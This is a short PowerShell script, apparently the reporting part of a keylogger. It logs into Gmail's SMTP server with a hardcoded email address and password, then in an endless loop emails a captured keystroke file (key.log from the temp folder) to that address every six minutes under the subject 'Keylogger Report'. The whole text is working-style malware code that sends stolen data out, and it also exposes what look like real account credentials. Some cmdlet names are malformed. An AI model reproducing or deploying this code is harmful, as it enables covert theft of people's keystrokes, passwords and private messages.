$SMTPServer = 'smtp.gmail.com'
$SMTPInfo = New - Object Net.Mail.SmtpClient($SMTPServer, 587)
$SMTPInfo.EnableSsl = $true
$SMTPInfo.Credentials = New - Object System.Net.NetworkCredential('zaghum.mughal.1@gmail.com', ',.H@cked12,.')
$message = New - Object System.Net.Mail.MailMessage
$message.From = 'zaghum.mughal.1@gmail.com'
$message.To.Add('zaghum.mughal.1@gmail.com')
$message.Subject = 'Keylogger Report'
while (1) {
    $message.Attachments.Add("$ENV:temp\key.log");
    $SMTPInfo.Send($message);
    sleep 360
}
